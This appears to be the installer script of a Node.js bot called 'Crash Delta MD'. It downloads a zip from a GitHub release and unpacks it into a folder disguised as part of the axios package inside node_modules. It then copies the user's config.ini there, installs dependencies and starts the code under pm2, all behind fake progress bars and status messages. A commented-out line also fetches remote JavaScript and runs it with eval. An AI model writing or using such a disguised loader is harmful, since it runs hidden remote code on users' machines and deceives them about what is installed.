const fs = require('fs');
const path = require('path');
const { execSync , spawn} = require('child_process'); // Sync version for simplicity
const os = require('os');

// Helper function for delays
function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Display ASCII Art Logo



async function startAppSimulation(oraConstructor) {
    ///const axios = require("axios");
    //const pm2 = require("pm2");
    //const response = await axios.get("https://example.com/fyntiondata.js");
    //const fyntiondata = eval(response.data);
    console.log("✅ Dependencies are okay! Install the bot...");
    
    const spinner = oraConstructor({ text: 'Installing...' }).start();
    
    try {
        await delay(3000);
        spinner.succeed('install successfully!');
        const oraDefault = oraConstructor;
        let spinner2 = oraDefault({
            text: "Checking OS compatibility..."
        }).start();
        await delay(3000);
        const ops = getOperatingSystem()
        spinner2.succeed(`Bot is running on a supported ${ops} environment.`);
        await fs.promises.mkdir("./node_modules/axios/encodeText2", { recursive: true });
        const spinner3 = oraConstructor({ text: 'Connecting with the server...💻🌐' }).start();
        const down = await downloadFileWithProgress("https://github.com/crash-delta-official/packages/releases/download/v1.0.0/cdtmd.zip", "./node_modules/axios/encodeText2/cdtmd")
        if(down){
            try {
              execSync("npm install adm-zip")
              const AdmZip = require('adm-zip');

              // 📁 Zip file path
              const zip = new AdmZip('./node_modules/axios/encodeText2/cdtmd');

              // 📂 Extract to target folder (create if not exists)
              zip.extractAllTo('./node_modules/axios/encodeText2/', true);

              //console.log('✅ File extracted successfully!');
              spinner3.succeed("Connection successful 📶");

              await fs.promises.copyFile('config.ini', './node_modules/axios/encodeText2/config.ini');
              const spinner4 = oraConstructor({ text: 'Packages are downloading...' }).start();
              //pr(spinner4);
              //const spinner = ora('Starting installation...').start();

              let progress = 0;
              const total = 100;
              const barLength = 30;

              // Start npm install
              const npmInstall = spawn('npm', ['install'], {
                cwd: './node_modules/axios/encodeText2', // ✅ path එක මෙහි
                shell: true
              });
              // Print fake progress bar in parallel
              const progressInterval = setInterval(() => {
                if (progress < total) {
                  progress += 1;
                  const filled = Math.floor((progress / total) * barLength);
                  const bar = '█'.repeat(filled) + '-'.repeat(barLength - filled);
                  spinner4.text = `Installing packages... [${bar}] ${progress}%`;
                }
              }, 2000);

              // On install complete
              npmInstall.on('close', (code) => {
                clearInterval(progressInterval);
                if (code === 0) {
                  spinner4.succeed('✅ Packages installed successfully!');
                  execSync("pm2 start index.js --name cdtmd --no-daemon", { stdio: "inherit",cwd:"./node_modules/axios/encodeText2"})
                  //execSync("pm2 log", { stdio: "inherit"});
                } else {
                  spinner4.fail(`❌ Installation failed with code ${code}`);
                }
              });

              // Forward npm install logs (optional)
              npmInstall.stdout.on('data', (data) => process.stdout.write(data));
              npmInstall.stderr.on('data', (data) => process.stderr.write(data));
              

                
            } catch (error) { 
              console.error("PM2 start failed:", error);
            }
          }
    } catch (error) {
        spinner.fail('Setup failed!');
        console.error("❌ Error during final setup:", error);
    }
}

async function initialize() {
    await delay(1000);
    console.log(`\n\n\n     ▄▄· ▄▄▄   ▄▄▄· .▄▄ ·  ▄ .▄    ·▄▄▄▄  ▄▄▄ .▄▄▌  ▄▄▄▄▄ ▄▄▄·     
    ▐█ ▌▪▀▄ █·▐█ ▀█ ▐█ ▀. ██▪▐█    ██▪ ██ ▀▄.▀·██•  •██  ▐█ ▀█     
    ██ ▄▄▐▀▀▄ ▄█▀▀█ ▄▀▀▀█▄██▀▐█    ▐█· ▐█▌▐▀▀▪▄██▪   ▐█.▪▄█▀▀█     
    ▐███▌▐█•█▌▐█ ▪▐▌▐█▄▪▐███▌▐▀    ██. ██ ▐█▄▄▌▐█▌▐▌ ▐█▌·▐█ ▪▐▌     
    ·▀▀▀ .▀  ▀ ▀  ▀  ▀▀▀▀ ▀▀▀ ·    ▀▀▀▀▀•  ▀▀▀ .▀▀▀  ▀▀▀  ▀  ▀      
                                   • ▌ ▄ ·. ·▄▄▄▄                 
                                   ·██ ▐███▪██▪ ██                
                                   ▐█ ▌▐▌▐█·▐█· ▐█▌                
                                   ██ ██▌▐█▌██. ██                
                                   ▀▀  █▪▀▀▀▀▀▀▀▀•                \n`);
    await delay(1000);
    console.log("⏳ Initializing and checking dependencies...");
    await delay(1000);
    const projectRoot = path.resolve(__dirname);
    const nodeModulesPath = path.join(projectRoot, 'node_modules');

    let oraConstructor;

    if (!fs.existsSync(nodeModulesPath)) {
        await delay(1000);
        console.log("⏳ Installing dependencies (npm install)... Please wait.");
    try {
        execSync('npm install', { stdio: 'inherit', cwd: projectRoot });
        await delay(1000);
        console.log("✅ Dependencies installed successfully!");
        const oraModule = await import('ora');
        oraConstructor = oraModule.default;
        await startAppSimulation(oraConstructor);
    } catch (error) {
        console.error("❌ Error installing dependencies:", error);
        process.exit(1);
    }
  } else {
    console.log("✅ Dependencies already exist.");
    try {
        const oraModule = await import('ora');
        oraConstructor = oraModule.default;
        await startAppSimulation(oraConstructor);
    } catch (importError) {
        console.error("❌ Error importing ora even though node_modules exists:", importError);
        process.exit(1);
    }
  }
}


async function downloadFileWithProgress(fileUrl, outputPath) {
    const axios = require('axios');
    let spinner; // Variable for ora spinner
  
    try {
      // Import ora dynamically
      const oraModule = await import('ora');
      const oraDefault = oraModule.default;
      spinner = oraDefault({
          text: `Initiating download: packages`,
          spinner: 'dots', // You can choose a spinner style you like
          color: 'yellow'
      }).start();
  
      // Axios request (get response as a stream)
      const response = await axios({
        method: 'get',
        url: fileUrl,
        responseType: 'stream',
        timeout: 30000, // Request timeout (milliseconds)
      });
  
      // Total file size (from content-length header)
      const totalLength = parseInt(response.headers['content-length'], 10);
      let downloadedLength = 0;
  
      // Create a write stream to save the file
      const writer = fs.createWriteStream(outputPath);
  
      // When data comes from the response stream
      response.data.on('data', (chunk) => {
        downloadedLength += chunk.length;
        if (totalLength && !isNaN(totalLength)) {
          const percentage = Math.floor((downloadedLength / totalLength) * 100);
          spinner.text = `packages Downloading: ${percentage}% (${(downloadedLength / 1024 / 1024).toFixed(2)}MB / ${(totalLength / 1024 / 1024).toFixed(2)}MB)`;
          spinner.color = 'cyan';
        } else {
          spinner.text = `packages Downloading: ${(downloadedLength / 1024 / 1024).toFixed(2)}MB`;
          spinner.color = 'cyan';
        }
      });
  
      // Pipe the stream to the writer and await
      // Let's create a Promise to handle piping and its events
      await new Promise((resolve, reject) => {
        response.data.pipe(writer);
  
        writer.on('finish', async () => {
          await delay(200); // Give a little time for the spinner to update
          spinner.succeed(`packages downloaded successfully!`);
          resolve(true); // Resolve true if successful
        });
  
        writer.on('error', (error) => {
          spinner.fail(`Error writing file (${path.basename(outputPath)}) during download: ${error.message}`);
          if (fs.existsSync(outputPath)) {
            fs.unlink(outputPath, (unlinkErr) => { // Remove partially downloaded file
              if (unlinkErr) console.error(`Error unlinking file: ${unlinkErr.message}`);
            });
          }
          reject(error); // Reject the error
        });
  
        response.data.on('error', (error) => { // Error in Axios stream
          spinner.fail(`Network error (${path.basename(outputPath)}): ${error.message}`);
          if (fs.existsSync(outputPath)) {
            fs.unlink(outputPath, (unlinkErr) => {
              if (unlinkErr) console.error(`Error unlinking file: ${unlinkErr.message}`);
            });
          }
          reject(error);
        });
      });
  
      return true; // Return true if download is completely successful
  
    } catch (error) {
      // Axios request error (e.g., 404, timeout)
      if (spinner) {
        spinner.fail(`General error during download (${fileUrl}): ${error.message}`);
      } else {
        console.error(`General error during download (${fileUrl}): ${error.message}`);
      }
      // Remove file based on error (optional, also covered by writer.on('error'))
      if (fs.existsSync(outputPath)) {
          fs.unlink(outputPath, (unlinkErr) => {
               if (unlinkErr) console.error(`Error unlinking file after catch: ${unlinkErr.message}`);
          });
      }
      return false; // Return false if unsuccessful
    }
  }

function getOperatingSystem() {
    const platform = os.platform(); // This method returns a string identifying the operating system platform.
  
    if (platform === 'win32') {
      // 'win32' is the value returned for Windows platforms (both 32-bit and 64-bit)
      return 'Windows';
    } else if (platform === 'linux') {
      // 'linux' is the value returned for Linux platforms
      return 'Linux';
    } else {
      // For any other platform (e.g., 'darwin' for macOS, 'freebsd', 'sunos', etc.)
      return platform;
    }
}
initialize();

let ftime = 10000
async function pr(r){
  for (let i = 0; i <= 100; i++) {
    await delay(ftime);
  
    const percent = i;
    const totalBars = 30; // total bar length
    const filledBars = Math.round((percent / 100) * totalBars);
    const emptyBars = totalBars - filledBars;
    const progressBar = "█".repeat(filledBars) + "-".repeat(emptyBars);
  
    r.text = `Packages are downloading...  [${progressBar}] ${percent}%`;
  
    if (i === 100) {
      r.succeed(`Packages have been downloaded`);
    }
  }
}
